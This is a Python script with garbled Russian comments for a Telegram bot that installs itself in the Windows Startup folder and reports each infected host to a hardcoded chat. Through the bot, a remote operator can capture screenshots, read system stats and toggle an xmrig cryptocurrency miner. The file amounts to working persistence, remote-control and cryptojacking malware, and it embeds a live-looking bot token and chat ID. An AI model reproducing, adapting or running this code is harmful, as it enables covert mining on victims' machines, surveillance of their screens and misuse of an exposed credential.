import os
import sys
import json
import getpass
import subprocess
import psutil
import socket
import mss
import telebot
from datetime import timedelta
from threading import Thread

# ==== –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ====
BOT_TOKEN = "8108497510:AAE43G8iaKMmoL8bJMp7SmK5aQSwGMjGugo"
XMGRIG_EXE = "xmrig.exe"
CONFIG_FILE = "config.json"

bot = telebot.TeleBot(BOT_TOKEN)
devices = {socket.gethostname(): None}  # –ó–¥–µ—Å—å –±—É–¥–µ—Ç —Ö—Ä–∞–Ω–∏—Ç—å—Å—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö
mining_process = None  # –î–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –º–∞–π–Ω–µ—Ä–æ–º

# ==== –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫ Windows ====
def add_to_startup():
    username = getpass.getuser()
    startup_path = fr'C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    script_name = os.path.basename(sys.argv[0])
    shortcut_path = os.path.join(startup_path, f'{os.path.splitext(script_name)[0]}.lnk')
    if not os.path.exists(shortcut_path):
        try:
            import winshell
            from win32com.client import Dispatch
            path = os.path.realpath(sys.argv[0])
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortcut(shortcut_path)
            shortcut.TargetPath = sys.executable
            shortcut.Arguments = f'"{path}"'
            shortcut.WorkingDirectory = os.path.dirname(path)
            shortcut.IconLocation = sys.executable
            shortcut.save()
        except Exception as e:
            print("–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É:", e)

# ==== –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ ====
def send_startup_message():
    bot.send_message(chat_id=YOUR_CHAT_ID, text=f"‚úÖ –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ `{socket.gethostname()}` —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–æ!", parse_mode="Markdown")

# ==== –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ —Å–∏—Å—Ç–µ–º–µ ====
def get_system_info():
    cpu = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory().percent
    disk = psutil.disk_usage('/').percent
    net = psutil.net_io_counters()
    uptime = timedelta(seconds=int(psutil.boot_time()))
    return {
        'cpu': cpu,
        'ram': ram,
        'disk': disk,
        'net_sent': net.bytes_sent / (1024 ** 2),
        'net_recv': net.bytes_recv / (1024 ** 2),
        'uptime': str(uptime).split('.')[0]
    }

# ==== –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º–∞–π–Ω–µ—Ä–æ–º ====
def start_mining():
    global mining_process
    if mining_process is None or mining_process.poll() is not None:
        mining_process = subprocess.Popen([XMGRIG_EXE, "-c", CONFIG_FILE])

def stop_mining():
    global mining_process
    if mining_process and mining_process.poll() is None:
        mining_process.terminate()
        mining_process = None

def is_mining():
    return mining_process is not None and mining_process.poll() is None

# ==== –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –±–æ—Ç–∞ ====
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2)
    for device in devices:
        markup.add(telebot.types.KeyboardButton(device))
    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text in devices)
def device_selected(message):
    chat_id = message.chat.id
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton("üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç", callback_data="screenshot"),
        telebot.types.InlineKeyboardButton("üìä –°—Ç–∞—Ç—É—Å", callback_data="status")
    )
    bot.send_message(chat_id, "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "screenshot")
def take_screenshot(call):
    with mss.mss() as sct:
        filename = sct.shot(output="screenshot.png")
    with open(filename, 'rb') as photo:
        bot.send_photo(call.message.chat.id, photo)
    os.remove(filename)

@bot.callback_query_handler(func=lambda call: call.data == "status")
def system_status(call):
    info = get_system_info()
    status_text = (
        f"üñ•Ô∏è –°—Ç–∞—Ç—É—Å —Å–∏—Å—Ç–µ–º—ã:\n"
        f"üß† –¶–ü: {info['cpu']}%\n"
        f"üíæ RAM: {info['ram']}%\n"
        f"üì¶ –î–∏—Å–∫: {info['disk']}%\n"
        f"üì§ –°–µ—Ç—å: ‚Üë{info['net_sent']:.2f} –ú–ë\n"
        f"üì• ‚Üì{info['net_recv']:.2f} –ú–ë\n"
        f"‚è± –ê–ø—Ç–∞–π–º: {info['uptime']}"
    )

    mining_status = "üü¢ –ú–∞–π–Ω–∏–Ω–≥: –í–∫–ª—é—á–µ–Ω" if is_mining() else "üî¥ –ú–∞–π–Ω–∏–Ω–≥: –í—ã–∫–ª—é—á–µ–Ω"
    status_text += f"\n‚õè {mining_status}"

    markup = telebot.types.InlineKeyboardMarkup()
    btn = telebot.types.InlineKeyboardButton(
        "‚ùå –í—ã–∫–ª—é—á–∏—Ç—å –º–∞–π–Ω–∏–Ω–≥" if is_mining() else "‚úÖ –í–∫–ª—é—á–∏—Ç—å –º–∞–π–Ω–∏–Ω–≥",
        callback_data="toggle_mining"
    )
    markup.add(btn)

    bot.edit_message_text(status_text, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "toggle_mining")
def toggle_mining(call):
    if is_mining():
        stop_mining()
    else:
        start_mining()
    system_status(call)

# ==== –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è ====
if __name__ == "__main__":
    add_to_startup()

    # –ó–∞–ø—Ä–æ—Å ID —á–∞—Ç–∞
    YOUR_CHAT_ID = "1470225013"  # –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π ID

    # –°–æ–æ–±—â–µ–Ω–∏–µ –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
    send_startup_message()

    # –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞ –≤ –ø–æ—Ç–æ–∫–µ
    Thread(target=bot.polling, kwargs={"none_stop": True}).start()